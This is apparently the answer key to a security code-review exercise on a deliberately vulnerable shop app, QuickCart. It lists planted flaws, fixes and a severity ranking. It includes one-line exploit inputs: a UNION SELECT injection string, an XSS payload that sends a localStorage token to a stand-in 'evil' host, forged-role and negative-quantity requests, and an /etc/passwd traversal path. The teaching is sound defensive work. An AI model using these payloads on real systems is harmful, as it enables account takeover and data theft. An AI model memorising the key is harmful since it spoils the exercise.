# SOLUTIONS — QuickCart (do not open until you've finished your review)

Planted issues, grouped by theme. File:line references are approximate.

## THEME 1 — Authentication & token handling (Critical)

### 1. JWT signature never verified — `backend/auth.js` (`requireAuth`)
`jwt.decode(token)` decodes the payload **without verifying the signature**. An attacker
forges any token (`{ id: 1, role: 'admin' }`), and the server trusts it.
- **Impact:** complete authentication bypass + privilege escalation. CRITICAL.
- **Exploit:** base64-encode a payload with `role:'admin'`, send as Bearer token.
- **Local fix:** `const payload = jwt.verify(token, JWT_SECRET);` (pin `algorithms:['HS256']`).
- **Systemic:** one token helper that always *verifies*; lint/grep-ban `jwt.decode` for authz;
  validate `exp`/`aud`/`iss`; prefer asymmetric keys for multi-service.

### 2. Hardcoded, weak JWT secret — `backend/auth.js` (`JWT_SECRET`)
`'quickcart-secret'` is in source. Even after fixing #1, a known/guessable secret lets
attackers mint valid tokens.
- **Impact:** token forgery. HIGH (compounds #1).
- **Fix:** load from env/secret manager; long random secret; rotate (it's now leaked).
- **Systemic:** secret scanning in CI; no secrets in code; rotation policy.

## THEME 2 — Broken authorization (Critical/High)

### 3. Missing function-level authorization on admin routes — `backend/routes/admin.js`
All admin endpoints use `requireAuth` only — **no role check**. Any logged-in customer can
list every user, grant themselves credit, or delete users.
- **Impact:** privilege escalation, data theft, destructive actions. CRITICAL.
- **Exploit:** `POST /api/admin/users/<me>/credit { amount: 1000000 }`.
- **Local fix:** add `requireAdmin` middleware: `if (req.user.role !== 'admin') return res.sendStatus(403)`.
- **Systemic:** default-deny; mount role checks on the whole `/api/admin` subtree; RBAC policy
  layer; tests asserting non-admins get 403.

### 4. IDOR / broken object-level authorization — `backend/routes/orders.js` (`GET /:id`)
Returns any order by ID with no ownership check.
- **Impact:** any user reads anyone's orders (PII, purchase history). HIGH.
- **Local fix:** `if (order.user_id !== req.user.id) return res.sendStatus(404)`.
- **Systemic:** scope queries by owner (`WHERE user_id = ?`); centralized authorization;
  authz test per endpoint.

## THEME 3 — Injection (Critical/High)

### 5. SQL injection — `backend/routes/products.js` (`GET /` search)
`` `... WHERE name LIKE '%${q}%'` `` interpolates user input into SQL.
- **Impact:** data exfiltration (UNION SELECT users), auth data dump. HIGH→CRITICAL.
- **Exploit:** `?q=' UNION SELECT id,email,password,role,credit FROM users-- `.
- **Local fix:** parameterize: `WHERE name LIKE ?` with `['%'+q+'%']`.
- **Systemic:** ban string-built SQL (lint/SAST); ORM/query builder; least-privilege DB user.

### 6. Stored XSS — `backend/routes/products.js` (review POST stores raw) + `public/app.js`
Review `body` is stored unsanitized and rendered with `innerHTML` in `loadReviews`/`search`.
- **Impact:** stored XSS → session/token theft (token is in `localStorage`!), account takeover. HIGH.
- **Exploit:** post review `<img src=x onerror="fetch('//evil/'+localStorage.token)">`.
- **Local fix:** render with `textContent`, or build nodes; sanitize with DOMPurify if HTML needed.
- **Systemic:** output-encode by default; ban `innerHTML`; CSP; don't store auth tokens in
  `localStorage` (use HttpOnly cookies).

## THEME 4 — Business logic (Critical/High)

### 7. Client-supplied price + unvalidated quantity — `backend/routes/orders.js` (`/checkout`)
`unitPrice = price != null ? price : product.price` trusts a client price; `qty` is
unvalidated. Negative/zero values allowed; total never bounded.
- **Impact:** buy for $0.01, or send negative qty/price to **increase your own credit**
  (`credit - (negative total)` grows). CRITICAL (direct financial loss).
- **Exploit:** `POST /checkout { productId:1, qty:-100, price:100 }` → total -10000 → credit +10000.
- **Local fix:** ignore client price (use `product.price`); validate `Number.isInteger(qty) && qty>0`;
  reject if `credit < total`.
- **Systemic:** server is source of truth — client sends item IDs only; schema validation
  (min/max) at the boundary; DB CHECK constraints; decimal money type.

### 8. Mass assignment of `role` / `credit` on register — `backend/routes/users.js`
Register inserts `role` and `credit` straight from `req.body`.
- **Impact:** self-register as `admin` or with arbitrary store credit. CRITICAL (with #3, owns the app).
- **Exploit:** `POST /register { email, password, role:'admin', credit:999999 }`.
- **Local fix:** hardcode `role:'customer', credit:0`; allowlist `{email,password,name}`.
- **Systemic:** explicit write DTOs; never bind request body to privileged fields; deny unknown fields.

## THEME 5 — Sensitive data & files (High/Medium)

### 9. Path traversal in receipt download — `backend/routes/orders.js` (`/receipt/download`)
`fs.readFileSync(path.join(RECEIPTS_DIR, file))` with raw `file` query param. No
ownership check either.
- **Impact:** read arbitrary files: `?file=../backend/auth.js` (leaks JWT secret),
  `?file=../../../../etc/passwd`. HIGH.
- **Local fix:** resolve and confine to `RECEIPTS_DIR`; reject if outside; check the receipt
  belongs to the user's order.
- **Systemic:** never build paths from raw input; map order→receipt server-side via opaque ID;
  serve from object storage with signed URLs.

### 10. Password hashing with unsalted MD5 — `backend/db.js` (`md5`) + `users.js`
- **Impact:** instant cracking on DB leak; rainbow tables (no salt). HIGH.
- **Fix:** `bcrypt`/`argon2` with per-user salt + work factor; constant-time compare.
- **Systemic:** one vetted hashing helper; migrate on next login; never roll your own.

### 11. Full user row (incl. password hash) returned — `backend/routes/users.js` (login/register)
`res.json({ token, user })` leaks `password` hash and other internal fields.
- **Impact:** sensitive data exposure. MEDIUM.
- **Fix:** return an allowlisted DTO `{id,email,name,role}`.
- **Systemic:** response serializers/DTOs; never return raw DB rows.

## THEME 6 — Hardening / lower severity

### 12. No rate limiting on login — `backend/routes/users.js` (`/login`)
Unlimited attempts → brute force / credential stuffing (worsened by fast MD5). MEDIUM.
Fix: per-IP/per-account rate limit + lockout; gateway/WAF rate limiting systemically.

### 13. Verbose error handler leaks stack traces — `backend/server.js`
Returns `err.message` + `err.stack` to clients → info disclosure. LOW/MEDIUM.
Fix: log server-side, return generic message + error ID; dev-only verbosity.

### 14. Credit update race condition (TOCTOU) — `backend/routes/orders.js` (`/checkout`)
Read credit → subtract → write is not atomic; concurrent checkouts double-spend. MEDIUM.
Fix: atomic `UPDATE ... SET credit = credit - ? WHERE id=? AND credit >= ?`; transactions.

### 15. Missing security headers / HTTPS — `backend/server.js`
No `helmet`, CSP, HSTS, secure cookie posture. LOW (defense-in-depth). Add `helmet()`.

---

## Suggested severity ranking (for the "what would you block release for?" question)
**Block release (Critical):** #1 JWT decode, #3 admin authz, #7 checkout logic, #8 mass assignment.
**Fix before launch (High):** #4 IDOR, #5 SQLi, #6 stored XSS, #9 path traversal, #2 secret, #10 MD5.
**Backlog (Med/Low):** #11 data exposure, #12 rate limit, #13 error leak, #14 race, #15 headers.

## The systemic story to tell
Three root causes explain most findings: (a) **authorization is ad hoc** — no central policy,
checks missing or auth-only (→ #1,#3,#4,#8); (b) **the server trusts client input** — price,
role, file path, SQL, HTML (→ #5,#6,#7,#8,#9); (c) **no secure-by-default plumbing** — DTOs,
parameterized queries, output encoding, secret management, headers. Fix the patterns, not just
the 15 instances.
